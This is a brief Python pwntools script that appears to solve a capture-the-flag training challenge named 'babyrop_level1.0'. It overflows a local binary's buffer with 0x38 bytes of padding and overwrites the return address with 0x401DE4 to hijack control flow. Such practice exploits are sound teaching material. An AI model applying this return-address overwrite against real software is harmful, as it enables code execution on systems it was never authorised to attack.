from pwn import *

p = process("/challenge/babyrop_level1.0")

p.recvuntil(b"return address).")
p.send(b"A"*0x38 + 0x401DE4.to_bytes(8,"little"))
all = p.recvall()
print(all.decode())